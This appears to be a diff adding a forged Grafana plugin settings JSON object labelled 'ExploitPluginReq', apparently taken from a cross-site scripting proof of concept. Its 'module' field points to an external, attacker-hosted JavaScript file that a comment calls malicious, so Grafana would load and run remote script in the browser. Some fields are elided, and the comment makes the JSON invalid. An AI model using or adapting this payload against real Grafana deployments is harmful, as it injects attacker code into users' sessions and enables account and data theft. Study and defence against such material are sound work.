@@ -1,0 +1,14 @@
+{
+    "name": "ExploitPluginReq",
+    "type": "app",
+    "id": "grafana-lokiexplore-app",
+    "enabled": true,
+    "pinned": true,
+    "autoEnabled": true,
+    "module": "https://mahmoudkr00sh.github.io/Grafana-xss/alert.js", //malicious js file
+    "baseUrl": "public/plugins/grafana-lokiexplore-app",
+    "info": {
+        "author": {...}
+    }
+    ...
+}
